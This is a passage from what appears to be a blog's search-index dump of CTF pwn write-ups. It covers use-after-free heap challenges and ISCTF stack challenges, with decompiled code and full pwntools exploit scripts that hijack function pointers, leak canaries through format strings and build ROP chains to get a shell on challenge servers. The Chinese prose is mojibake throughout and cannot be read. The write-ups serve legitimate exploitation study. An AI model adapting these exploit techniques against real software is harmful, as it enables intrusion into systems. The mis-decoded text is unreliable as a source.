rdi,rdiï¼ˆä¿é™©èµ·è§ï¼‰ï¼Œå°±æ˜¯ä¸ºäº†è®©rdi&#x3D;0ã€‚rsiæ­¤æ—¶æŒ‡å‘çš„åœ°å€å°±æ˜¯bssæ®µï¼Œæ‰€ä»¥ä¸éœ€è¦è¿›è¡Œä¿®æ”¹ã€‚è€Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªè¾ƒé•¿çš„è¯»å–é•¿åº¦ã€‚å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„r11å­˜æ”¾ç€0x246å°±å·²ç»å¤Ÿäº†ï¼Œæ‰€ä»¥ç”¨mov rdx,r11å°±å¯ä»¥å°†æŠŠr11ä¸­çš„å€¼ç»™rdxï¼Œè‡³æ­¤ä¸€ä¸ªè¯»å–è¾ƒé•¿é•¿åº¦çš„readå‡½æ•°å°±æ„é€ å¥½äº†ã€‚æœ€ååˆç”¨åˆ°äº†ä¸€ä¸ªnop sledçš„æŠ€å·§ï¼Œé€šè¿‡å¡«å……å¤§é‡çš„nopæ¥ä½¿æ‰§è¡Œè‡ªå·±çš„æ¶æ„ä»£ç çš„æ¦‚ç‡æé«˜ã€‚\n","categories":["stack"],"tags":["pwnå…¥é—¨"]},{"title":"Heap from 0 to 1","url":"/2026/01/23/Heap-from-0-to-1/","content":"Heap from 0 to 1è¿™é‡Œä¼šè®°å½•ä»0åˆ°1æˆ‘çš„pwnå †é¢˜è®°å½•ã€‚è®°å½•ä¸€äº›ç»å…¸ä¾‹é¢˜å’Œå„ç§æŠ€å·§ã€‚\nUAFUse After Freeï¼šå³freeåå†æ¬¡è¿›è¡Œåˆ©ç”¨ã€‚Dangling Pointerï¼ˆæ‚¬æŒ‚æŒ‡é’ˆã€æ‚¬ç©ºæŒ‡é’ˆã€è¿·é€”æŒ‡é’ˆï¼‰æ˜¯è®¡ç®—æœºç¼–ç¨‹ä¸­çš„ä¸€ä¸ªå¸¸è§ä¸”å±é™©çš„é—®é¢˜ï¼Œå®ƒæŒ‡çš„æ˜¯ä¸€ä¸ªæŒ‡é’ˆä»ç„¶ä¿ç•™ç€ä¹‹å‰æŒ‡å‘çš„å†…å­˜åœ°å€ï¼Œä½†æ˜¯è¿™ç‰‡å†…å­˜åŒºåŸŸå¯èƒ½å·²ç»è¢«é‡Šæ”¾æˆ–è€…ä¸å†æœ‰æ•ˆï¼Œä»è€Œå¯èƒ½å¯¼è‡´ç¨‹åºåœ¨ä½¿ç”¨è¯¥æŒ‡é’ˆæ—¶å‡ºç°æœªå®šä¹‰è¡Œä¸ºã€‚\nä¸‹é¢æ˜¯ä¸€é“nssctfä¸­çš„é¢˜ç›®ã€‚\n1.[NISACTF 2022]UAFint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  _DWORD v3[4]; // [esp+8h] [ebp-10h] BYREF  v3[1] = __readgsdword(0x14u);  setbuf(stdin, 0);  setbuf(stdout, 0);  while ( 1 )  &#123;    while ( 1 )    &#123;      puts(&quot;1.create&quot;);      puts(&quot;2.edit&quot;);      puts(&quot;3.delete&quot;);      puts(&quot;4.show&quot;);      putchar(&#x27;:&#x27;);      __isoc99_scanf(&quot;%d&quot;, v3);      if ( v3[0] != 2 )        break;      edit();    &#125;    if ( v3[0] &gt; 2 )    &#123;      if ( v3[0] == 3 )      &#123;        del();      &#125;      else if ( v3[0] == 4 )      &#123;        show();      &#125;      else      &#123;LABEL_13:        puts(&quot;Invalid choice&quot;);      &#125;    &#125;    else    &#123;      if ( v3[0] != 1 )        goto LABEL_13;      create();    &#125;  &#125;&#125;\n\næ“ä½œä¸»è¦çœ‹showå‡½æ•°ã€‚\nunsigned int show()&#123;  int i; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;i);  if ( i )  &#123;    if ( i &lt;= 0 || i &gt; i )      puts(&quot;NO PAGE&quot;);    else      echo((&amp;page)[i]);  &#125;  else  &#123;    (*((void (__cdecl **)(char *))page + 1))(page);  &#125;  return __readgsdword(0x14u) ^ v2;&#125;\n\nå¯ä»¥çœ‹å‡ºï¼Œå½“i&#x3D;0çš„æ—¶å€™ä¼šæ‰§è¡Œelseé‡Œçš„è¯­å¥ï¼Œå³è°ƒç”¨æˆ‘ä»¬è¾“å…¥åˆ°pageé‡Œçš„echoå‡½æ•°ã€‚é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬å°†pageé‡Œechoå‡½æ•°æ”¹ä¸ºsystemå‡½æ•°çš„pltè¡¨ï¼Œå†è¾“å…¥&#x2F;bin&#x2F;shå°±å¯ä»¥æˆåŠŸgetsehlläº†ã€‚é¦–å…ˆå…ˆç¡®å®šä¸€ä¸‹echoå‡½æ•°çš„ä½ç½®ã€‚\n\nç”±äºæ˜¯32ä½ç¨‹åºï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•è¾“å…¥&#x2F;bin&#x2F;shã€‚å°±å¯ä»¥è¾“å…¥shã€‚ä½†æ˜¯shåªå ä¸¤ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥å¯ä»¥ç”¨sh;\\x00æ¥æˆªæ–­systemçš„è¯»å–ã€‚å°±å¯ä»¥è¾¾åˆ°system(â€œshâ€)çš„æ•ˆæœäº†ã€‚\næ¼æ´ç‚¹åœ¨delå‡½æ•°ã€‚\nunsigned int del()&#123;  int i; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  puts(&quot;Input page&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;i);  if ( i &lt; 0 || i &gt; i )    puts(&quot;NO PAGE&quot;);  else    free((&amp;page)[i]);  return __readgsdword(0x14u) ^ v2;&#125;\n\nç”±äºè¿™é‡Œfreeæ‰chunk[i]åï¼Œå¹¶æ²¡æœ‰ç»™è¯¥æŒ‡é’ˆèµ‹å€¼ä¸ºNULLã€‚æ‰€ä»¥è¿™é‡Œå‡ºç°äº†é‡æŒ‡é’ˆã€‚æ­¤æ—¶çš„æŒ‡é’ˆä»ç„¶æŒ‡å‘æˆ‘ä»¬åˆšåˆšåˆ é™¤çš„chunkã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä»ç„¶å¯ä»¥éæ³•è®¿é—®è¯¥chunkã€‚æ‰€ä»¥å¯ä»¥åšåˆ°æ”¹å†™echoå‡½æ•°ä¸ºsystemå‡½æ•°ã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *context.log_level = &#x27;debug&#x27;#io = remote(&#x27;node4.anna.nssctf.cn&#x27;,26097)io = process(&#x27;./pwn&#x27;)def add():    io.recvuntil(b&#x27;:&#x27;)    io.sendline(b&#x27;1&#x27;)def edit(idx,pl):    io.recvuntil(b&#x27;:&#x27;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(b&#x27;page&#x27;)    io.sendline(str(idx))    io.recvuntil(b&#x27;strings&#x27;)    io.sendline(pl)def free(idx):    io.recvuntil(b&#x27;:&#x27;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(b&#x27;page&#x27;)    io.sendline(str(idx))def show(idx):    io.recvuntil(b&#x27;:&#x27;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(b&#x27;page&#x27;)    io.sendline(str(idx))    add() #index 0free(0)add() #index 1pl = b&#x27;sh;\\x00&#x27; + p32(0x80484e0)gdb.attach(io)edit(1,pl)show(0)io.interactive()\n\nè¿™é‡Œå…ˆæ˜¯åˆ›å»ºäº†ä¸€ä¸ªchunkï¼Œç„¶åé‡Šæ”¾æ‰ã€‚æ­¤æ—¶indexä¸º0å°±å¯ä»¥è®¿é—®åˆ°æˆ‘ä»¬åˆšåˆšç”³è¯·çš„chunkã€‚å†æ¬¡åˆ›å»ºä¸€ä¸ªchunkï¼Œindexä¸º1ã€‚ä½†æ˜¯1å’Œ0æ‰€æŒ‡å‘çš„chunkå…¶å®æ˜¯åŒä¸€ä¸ªå †å—ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡indexä¸º1æ¥ä»»æ„ä¿®æ”¹è¯¥chunkçš„å†…å®¹ï¼Œå†é€šè¿‡indexä¸º0æ¥è°ƒç”¨è¯¥å †å—ã€‚\n2.[BJDCTF 2020]YDSneedGirlfriendè¿™é“é¢˜å’Œä¸Šé¢è¿˜æ˜¯æœ‰ç‚¹ç›¸ä¼¼æ€§çš„ï¼Œä¸è¿‡è¿™ä¸ªé¢˜ç›®åå­—å‡ºçš„å¾ˆæŠ½è±¡å•Šå“ˆå“ˆã€‚\nä¿æŠ¤æƒ…å†µï¼š\n[*] &#x27;/home/xizi/Desktop/nssctf/heap/3/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    Stripped:   No\n\nint __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  int n2; // eax  char buf[8]; // [rsp+0h] [rbp-10h] BYREF  unsigned __int64 v5; // [rsp+8h] [rbp-8h]  v5 = __readfsqword(0x28u);  myinit();  while ( 1 )  &#123;    while ( 1 )    &#123;      menu();      read(0, buf, 4uLL);      n2 = atoi(buf);      if ( n2 != 2 )        break;      del_girlfriend();                        &#125;    if ( n2 &gt; 2 )    &#123;      if ( n2 == 3 )      &#123;        print_girlfriend();      &#125;      else      &#123;        if ( n2 == 4 )          exit(0);LABEL_13:        puts(&quot;Invalid choice&quot;);      &#125;    &#125;    else    &#123;      if ( n2 != 1 )        goto LABEL_13;      add_girlfriend();    &#125;  &#125;&#125;\n\nå’Œä¸Šé¢ä¸€æ ·ä¹Ÿæ˜¯å…ˆç»™ä¸€ä¸ªèœå•ï¼Œåˆ†åˆ«è®©æˆ‘ä»¬å»åˆ›å»ºï¼Œåˆ é™¤ï¼Œè¾“å…¥chunkã€‚\nåŒæ—¶åœ¨print_girlfriendå‡½æ•°é‡Œå¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„å†…å®¹è¾“å‡ºã€‚\nunsigned __int64 print_girlfriend()&#123;  int count; // [rsp+Ch] [rbp-14h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v3; // [rsp+18h] [rbp-8h]  v3 = __readfsqword(0x28u);  printf(&quot;Index :&quot;);  read(0, buf, 4uLL);  count = atoi(buf);  if ( count &gt;= 0 &amp;&amp; count &lt; count )  &#123;    if ( *(&amp;girlfriendlist + count) )      (*(void (__fastcall **)(_QWORD))*(&amp;girlfriendlist + count))(*(&amp;girlfriendlist + count));  &#125;  else  &#123;    puts(&quot;Out of bound!&quot;);  &#125;  return __readfsqword(0x28u) ^ v3;&#125;\n\nåœ¨add_girlfriendå‡½æ•°é‡Œå¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œå°†æˆ‘ä»¬ç”³è¯·çš„å †å—åˆ†æˆäº†ä¸¤ä¸ªã€‚ä¸€ä¸ªæ˜¯struct chunkï¼Œé‡Œé¢æ”¾ç€print_girlfriendå‡½æ•°çš„æŒ‡é’ˆå’Œæˆ‘ä»¬è¾“å…¥çš„å†…å®¹çš„æŒ‡é’ˆã€‚å¦ä¸€ä¸ªæ˜¯content chunkï¼Œé‡Œé¢å­˜æ”¾ç€æˆ‘ä»¬å†™å…¥çš„å†…å®¹ã€‚ä¹Ÿå¯ä»¥ä»gdbé‡Œçœ‹å‡ºæ¥ã€‚\n\nunsigned __int64 add_girlfriend()&#123;  __int64 v0; // rbx  int i; // [rsp+8h] [rbp-28h]  int top_chunk_name_size_name; // [rsp+Ch] [rbp-24h]  char buf[8]; // [rsp+10h] [rbp-20h] BYREF  unsigned __int64 v5; // [rsp+18h] [rbp-18h]  v5 = __readfsqword(0x28u);  if ( count &lt;= 10 )  &#123;    for ( i = 0; i &lt;= 9; ++i )    &#123;      if ( !*(&amp;girlfriendlist + i) )      &#123;        *(&amp;girlfriendlist + i) = malloc(0x10uLL);        if ( !*(&amp;girlfriendlist + i) )        &#123;          puts(&quot;Alloca Error&quot;);          exit(-1);        &#125;        *(_QWORD *)*(&amp;girlfriendlist + i) = print_girlfriend_name;        printf(&quot;Her name size is :&quot;);        read(0, buf, 8uLL);        top_chunk_name_size_name = atoi(buf);   // top chunk                                                // name size                                                // name        v0 = (__int64)*(&amp;girlfriendlist + i);        *(_QWORD *)(v0 + 8) = malloc(top_chunk_name_size_name);        if ( !*((_QWORD *)*(&amp;girlfriendlist + i) + 1) )        &#123;          puts(&quot;Alloca Error&quot;);          exit(-1);        &#125;        printf(&quot;Her name is :&quot;);        read(0, *((void **)*(&amp;girlfriendlist + i) + 1), top_chunk_name_size_name);        puts(&quot;Success !Wow YDS get a girlfriend!&quot;);        ++count;        return __readfsqword(0x28u) ^ v5;      &#125;    &#125;  &#125;  else  &#123;    puts(&quot;Full&quot;);  &#125;  return __readfsqword(0x28u) ^ v5;&#125;\n\næ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬å°†ç¬¬ä¸€ä¸ªstruct chunkæ”¾åœ¨æŒ‡å‘printf_girlfriendå‡½æ•°çš„æŒ‡é’ˆä¿®æ”¹ä¸ºæŒ‡å‘backdoorå‡½æ•°å°±å¯ä»¥æˆåŠŸgetshelläº†ã€‚\nä½†æ˜¯æˆ‘ä»¬åªèƒ½ä¿®æ”¹content chunké‡Œçš„å†…å®¹ï¼Œåˆè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ\nå…¶å®å¾ˆç®€å•ã€‚æˆ‘ä»¬åªéœ€è¦ç”³è¯·å’Œstruct chunk(0x10)å¤§å°ä¸åŒçš„chunkå°±å¯ä»¥äº†ã€‚å› ä¸ºå¤§å°ä¸åŒçš„chunkæ˜¯åˆ†ç»™ä¸åŒçš„binsæ¥ç®¡ç†çš„ã€‚é‚£ä¹ˆå½“æˆ‘ä»¬ç”³è¯·ä¸¤æ¬¡addï¼Œå†é‡Šæ”¾æ‰ã€‚å†ç”³è¯·ä¸€æ¬¡å¤§å°ä¸º0x10çš„content chunkå°±å¯ä»¥å°†æˆ‘ä»¬ç”³è¯·çš„å‰ä¸¤æ¬¡struct chunkåˆ†åˆ«ä½œä¸ºç¬¬ä¸‰æ¬¡çš„structå’Œcontent chunkäº†ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å‘content chunkå†™å…¥å†…å®¹å°†printæ”¹å†™ä¸ºbackdoorï¼Œå†é€šè¿‡printæ¥getshelläº†ã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *context.log_level = &#x27;debug&#x27;#io = process(&#x27;./pwn&#x27;)io = remote(&#x27;node4.anna.nssctf.cn&#x27;,27899)def add(size,name):    io.recvuntil(b&#x27;:&#x27;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(b&#x27;size is :&#x27;)    io.send(str(size))    io.recvuntil(b&#x27;name is :&#x27;)    io.sendline(name)def free(idx):    io.recvuntil(b&#x27;:&#x27;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(b&#x27;Index :&#x27;)    io.sendline(str(idx))def show(idx):    io.recvuntil(b&#x27;:&#x27;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(b&#x27;Index :&#x27;)    io.sendline(str(idx))backdoor  = 0x400b9cadd(0x20,&#x27;aaaaaa&#x27;) #idx 0add(0x20,&#x27;cccccc&#x27;) #idx 1free(0)free(1)#gdb.attach(io)add(0x10,p64(backdoor))show(0)io.interactive()\n\nè¿™é“é¢˜å…³é”®æ˜¯è¦å¼„æ¸…æ¥šå„ä¸ªå †å—å†…å­˜çš„ç®¡ç†ã€‚ä¹Ÿæ˜¯UAFçš„æ‰‹æ³•ã€‚\n","categories":["heap"],"tags":["pwnè¿›é˜¶"]},{"title":"ISCTF-Stack","url":"/2025/12/11/ISCTF-Stack/","content":"ISCTF1.Sign\nçœ‹idaé‡Œï¼Œå¯ä»¥çœ‹å‡ºbufæ˜¯ä¸€ç»´æ•°ç»„ã€‚ç±»å‹ä¸ºdwordï¼Œ4å­—èŠ‚ã€‚æ‰€ä»¥ç´¢å¼•å€¼ä¸º27çš„\næ—¶å€™ï¼Œå®é™…ä¸Šæ˜¯ç¬¬28ä¸ªå…ƒç´ ã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ§åˆ¶è¦†ã€‚ç›–bufçš„ç¬¬28ä¸ªå…ƒç´ ä¸º-1378178390å°±å¯ä»¥getshelläº†ã€‚é‚£ä¹ˆpaddingå°±æ˜¯27*4&#x3D;108ã€‚ç”±äºè¿™é‡Œæ˜¯æœ‰ç¬¦å·æ•°è½¬16è¿›åˆ¶ï¼Œæ‰€ä»¥ä¸Šç½‘ç«™è½¬æ¢ä¸€ä¸‹å°±è¡Œã€‚\n\nç›®æ ‡æ•°çš„16è¿›åˆ¶æ˜¯0xaddaaaaaã€‚åŒæ—¶ç”±äºè¿™é‡Œæ˜¯dwordï¼Œ4å­—èŠ‚ï¼Œæ‰€ä»¥ç”¨p32åŒ…è£¹0xaddaaaaaå°±å¯ä»¥getshelläº†ã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *io = remote(&#x27;challenge.bluesharkinfo.com&#x27;,25138)pl = b&#x27;a&#x27; * 108 + p32(0xaddaaaaa)io.sendafter(b&#x27;do you like blueshark?&#x27;,pl)io.interactive()\n\n2.Fmt\nç»å…¸çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²ã€‚ä½†æ˜¯è¿™é‡Œéœ€è¦æ¢ä¸€ä¸‹é™„ä»¶çš„ä¾èµ–ã€‚\nç”±äºè¿™é‡Œç»™äº†libc.so.6ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡strings libc.so.6 | grep â€œubuntuâ€æ¥è·å¾—ç‰ˆæœ¬ã€‚\nä¾‹å¦‚è¾“å‡ºï¼šGNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.10) stable release version 2.35.\næ‰€ä»¥å¯ä»¥åœ¨glibc-all-in-one å»å¯»æ‰¾2.35-0ununtu3çš„ç‰ˆæœ¬æ¥ä¸‹è½½åŠ¨æ€é“¾æ¥å™¨ï¼ˆä¸€èˆ¬ä¿æŒå¤§ç‰ˆæœ¬ç›¸åŒå°±è¡Œï¼‰ã€‚\npatchelf â€“replace-needed (åŸç‰ˆæœ¬)libc.so.6 (æ›¿æ¢çš„ç‰ˆæœ¬).&#x2F;libc.so.6 (æ–‡ä»¶å).&#x2F;pwn\npatchelf â€“set-interpreter ld-linux-x86-64.so.2(æ›¿æ¢çš„ç‰ˆæœ¬) .&#x2F;pwn\nå¦‚æœèƒ½æˆåŠŸè¿è¡Œç¨‹åºï¼Œé‚£ä¹ˆåŸºæœ¬å°±å¯ä»¥äº†ã€‚åƒæ£€æŸ¥çš„è¯ï¼Œå¯ä»¥ç”±ldd pwnæ¥æŸ¥çœ‹é™„ä»¶çš„ä»¥æ¥æƒ…å†µã€‚\nå›åˆ°è¿™é“é¢˜ï¼Œç¬¬ä¸€æ­¥è¿˜æ˜¯æµ‹è¯•æ•°æ®ã€‚å¯ä»¥å¾—åˆ°offset&#x3D;6ï¼Œé‚£ä¹ˆcanaryçš„ä½ç½®å°±æ˜¯6 +ï¼ˆ0x90-0x8ï¼‰&#x2F;8 &#x3D; 23ã€‚\n\nå¯ä»¥çœ‹å‡ºcanaryè·ç¦»ä¸º2çš„åœ°æ–¹å­˜æ”¾äº†mainçš„åœ°å€ï¼Œé‚£ä¹ˆå‡å»mainå‡½æ•°åœ¨idaé‡Œçš„åœ°å€ï¼ˆpieä¿æŠ¤ï¼‰ï¼Œå†å‡å»åç§»é‡ï¼Œå°±å¯ä»¥å¾—åˆ°ç¨‹åºçš„åŸºå€äº†ã€‚ï¼ˆä¹Ÿå¯ä»¥çœ‹mainå‡½æ•°ä¸­mov eaxï¼Œ0çš„ä½ç½®çš„åœ°å€æ˜¯å¤šå°‘ã€‚ï¼‰\nåŒæ—¶ç¨‹åºwinå‡½æ•°ä¸­å­˜æ”¾äº†shellï¼Œæ‰€ä»¥åé¢ç”¨ret2textçš„åšæ³•å°±å¯ä»¥getshelläº†ã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;#io = process(&#x27;./ez_fmt&#x27;)io = remote(&#x27;challenge.bluesharkinfo.com&#x27;,20932)elf = ELF(&#x27;./ez_fmt&#x27;)pl1 = b&#x27;%23$paa%25$p&#x27;io.sendafter(b&#x27;1st input: &#x27;,pl1)#canary = u64(io.recvuntil(b&#x27;\\x7f&#x27;)[:-6].rjust(8,b&#x27;\\x00&#x27;))io.recvuntil(b&#x27;0x&#x27;)canary = int(io.recv(16),16)success(hex(canary))io.recvuntil(b&#x27;0x&#x27;)pro_base = int(io.recv(12),16) - 97 - 0x12fasuccess(hex(pro_base))backdoor = elf.symbols[&#x27;win&#x27;] + pro_basesuccess(hex(backdoor))ret = 0x12f9 + pro_basepl2 = b&#x27;a&#x27; * (0x90-0x8) + p64(canary) + p64(0) + p64(ret) + p64(backdoor)io.sendafter(b&#x27;2nd input: &#x27;,pl2)io.interactive()\n\n3.EZ2048ä¸€é“éå¸¸æœ‰æ„æ€çš„é¢˜ç›®ğŸ¤”ã€‚\n\nå…·ä½“çš„ä»£ç ä¸å®Œå…¨å±•ç¤ºäº†ã€‚åŸºæœ¬é€»è¾‘å°±æ˜¯é€šè¿‡2048æ¥è·å–åˆ†æ•°ï¼Œæ»¡è¶³100000åˆ†åå¯ä»¥è¿›å…¥shellå‡½æ•°ã€‚è¿™é‡Œçš„æ¼æ´ç‚¹åœ¨æ•´å‹æº¢å‡ºã€‚ç”±äºæœ‰æœ‰ç¬¦å·æ•°è½¬æ— ç¬¦å·æ•°çš„ä»£ç ï¼Œæ‰€ä»¥å½“æœ‰ç¬¦å·æ•°ä¸º-1ç­‰æ•°çš„æ—¶å€™ï¼Œè½¬ä¸ºæ— ç¬¦å·æ•°æ˜¯æå¤§å€¼ã€‚ç”±äºè¿™é‡Œä¸€å¼€å§‹ç»™æˆ‘ä»¬50åˆ†ï¼Œç»“æŸä¸€å±€æ‰£10åˆ†ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡è¿ç»­æ¨å‡º6å±€æ¥ä½¿åˆ†æ•°è¾¾åˆ°-10è½¬æˆä¸€ä¸ªå¤§äº100000çš„åˆ†æ•°ï¼Œä»è€ŒæˆåŠŸè¿›å…¥shellå‡½æ•°ã€‚\n\nå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„shellå‡½æ•°åªä¼šæ‰§è¡Œä¸€ä¸ªlsçš„å‘½ä»¤ï¼Œè¿˜æœ‰ä¸€ä¸ªexitçš„å‘½ä»¤ã€‚åŒæ—¶è¿˜å­˜åœ¨canaryã€‚æ‰€ä»¥ç¬¬ä¸€ä¸ªæƒ³æ³•æ˜¯å…ˆæ³„éœ²canaryã€‚canaryåœ¨buf[17]çš„ä½ç½®ä¸Šï¼Œä¹Ÿå°±æ˜¯å‰é¢æœ‰17ä¸ªå…ƒç´ ã€‚qwordæ˜¯8å­—èŠ‚ï¼Œæ‰€ä»¥padding&#x3D;17*8&#x3D;136ã€‚ç”±äºprintfæˆªæ–­\\x00è¾“å‡ºçš„ç¼˜æ•…ï¼Œæ‰€ä»¥å†å¡«å……ä¸€ä¸ªjunkï¼Œå°†canaryé¡ºåŠ¿è¾“å‡ºã€‚\nå†ç»“åˆå‰é¢mainå‡½æ•°ï¼Œè®©ä½ è¾“å…¥åå­—çš„åœ°æ–¹ï¼Œå‘ç°bufçš„ä½ç½®æ­£å¥½æ˜¯bssæ®µã€‚æ‰€ä»¥å¯ä»¥å†™å…¥&#x2F;bin&#x2F;shï¼Œæœ€åå†å›åˆ°åœ°å€0x404a40æ¥å®ç°getshellã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *context.log_level = &#x27;debug&#x27;#io = process(&#x27;./ez2048&#x27;)io = remote(&#x27;challenge.bluesharkinfo.com&#x27;,23145)elf = ELF(&#x27;./ez2048&#x27;)bss = 0x404a46sys = 0x401170ret = 0x4027eardi = 0x40133eio.recvuntil(b&#x27;&gt;&#x27;)io.send(b&#x27;/bin/sh&#x27;)io.recvuntil(b&#x27;game&#x27;)io.send(b&#x27;\\n&#x27;)while(1):    sleep(1)    io.send(b&#x27;q&#x27;)    io.send(b&#x27;\\n&#x27;)    io.recvuntil(b&#x27;your score:&#x27;)    score = int(io.recvline()[:-1])    if score&lt;0:        io.recvuntil(b&#x27;&gt;&#x27;)        io.send(b&#x27;q&#x27;)        io.send(b&#x27;\\n&#x27;)        break    io.send(b&#x27;1&#x27;)    io.send(&#x27;\\n&#x27;)io.recvuntil(b&#x27;$ &#x27;) pl1 = b&#x27;a&#x27; * 136 + b&#x27;b&#x27;io.send(pl1)io.recvuntil(b&#x27;ab&#x27;)canary = u64(io.recv(7).rjust(8,b&#x27;\\x00&#x27;)) success(f&#x27;canary:&#x27;+hex(canary))payload = b&#x27;a&#x27; * (0x90-0x8) + p64(canary) + b&#x27;a&#x27; * 8 + p64(ret) + p64(rdi) + p64(bss) + p64(sys) io.recvuntil(b&#x27;$ &#x27;)io.send(payload)pause()io.send(b&#x27;exit&#x27;)io.interactive()\n\nè¿™é‡Œè§£é‡Šä¸€ä¸‹expã€‚\nbssåœ°å€ä¸ºä»€ä¹ˆè¦åç§»6ã€‚\nå¯ä»¥çœ‹ä¸€ä¸‹æºä»£ç ã€‚\nstrcpy(dest, &quot;Hello,&quot;);strcat(dest, buf);strcpy(buf, dest);\n\næ‰€ä»¥å¯ä»¥çœ‹å‡ºæ¥ï¼Œhelloå’Œæˆ‘ä»¬è¾“å…¥çš„å†…å®¹æ‹¼æ¥åœ¨ä¸€èµ·ï¼Œå¹¶ä¸”å†™åˆ°äº†bssæ®µä¸Šã€‚ï¼ˆå¯ä»¥é€šè¿‡gdbåŠ¨è°ƒçœ‹å‡ºã€‚ï¼‰\næœ€åä¸ºä»€ä¹ˆè¦å‘é€exitã€‚\nå› ä¸ºæˆ‘ä»¬æ„é€ çš„æ‰§è¡Œæµæ˜¯éœ€è¦åˆ°shellå‡½æ•°çš„ç»“æŸçš„æ—¶å€™æ‰ä¼šæ‰§è¡Œã€‚è€Œè¿™é‡Œå­˜åœ¨ä¸¤ä¸ªæ­»å¾ªç¯ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸»åŠ¨æ‰“ç ´æœ€å¤–å±‚çš„å¾ªç¯æ¥ä½¿ç¨‹åºæ‰§è¡Œæˆ‘ä»¬æ„é€ çš„æ¶æ„ä»£ç ã€‚\n4.Ret2ropè¿™é“é¢˜ä¸ºæˆ‘ä»¬å±•ç¤ºäº†ret2textçš„åšæ³•ï¼Œä¹Ÿå¾ˆæœ‰æ„æ€ã€‚\n\nè¿™æ˜¯vulnå‡½æ•°çš„ä¼ªä»£ç ï¼Œå¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œè¿˜æ˜¯æœ‰ä¸€ä¸ªéœ€è¦ä½ è¾“å…¥å§“åçš„ä»£ç ã€‚é‚£ä¹ˆç»“åˆä¸€ä¸‹ä¸Šé¢ä¸€é“é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥è¿˜æ˜¯éœ€è¦å¾€nameï¼ˆbssæ®µï¼‰å†…å¡«å…¥&#x2F;bin&#x2F;shã€‚\nè¿™é‡Œéœ€è¦æ³¨æ„çš„ç‚¹ã€‚\n\n1.frameæ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œé‡Œé¢çš„æˆå‘˜æœ‰bufå’Œmaskã€‚å¯ä»¥æŠŠbufå’Œmaskç†è§£ä¸ºæ•°ç»„ï¼Œå„è‡ªå«æœ‰32ä¸ªå…ƒç´ ã€‚\n2.è§‚å¯Ÿvulnå‡½æ•°å‘ç°ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªxorå¼‚æˆ–ä¿æŠ¤ã€‚å¯ä»¥çŸ¥é“ä¸€ä¸ªæ•°ä¸0å¼‚æˆ–ï¼Œå…¶å€¼ä¸å˜ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æˆ‘ä»¬æ„é€ çš„ropé“¾çš„åé¢å¡«å…¥å¤§é‡çš„\\x00æ¥ä¿è¯æˆ‘ä»¬çš„ropé“¾æˆåŠŸæ‰§è¡Œã€‚\nå¯ä»¥çœ‹å‡ºæ˜¯buf[i]^mask[i]ï¼Œå¹¶ä¸”æŠŠæœ€åçš„ç»“æœå†™å…¥åˆ°buf[i]ä¸­ã€‚æ‰€ä»¥ä¸¤è€…ä¹‹é—´çš„offset&#x3D;0x20ã€‚\n\nå¯ä»¥æ ¹æ®å›¾æ¥çœ‹æ ˆä¸Šçš„åŸºæœ¬ç»“æ„ã€‚æ‰€ä»¥è¿™é‡Œçš„ropä¼šä¸0x20ä¸ª0è¿›è¡Œå¼‚æˆ–ã€‚ç”±äºè¦ä¿è¯è¿™é‡Œçš„0x20ä¸º0ï¼Œæ‰€ä»¥å¾€åå¤šå¡«å……äº†ä¸€äº›0ï¼Œæ¥ä½¿0x20å¤„çš„0å€¼ä¸å˜ã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import * context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;io = process(&#x27;./ret2rop&#x27;)pop_rsi = 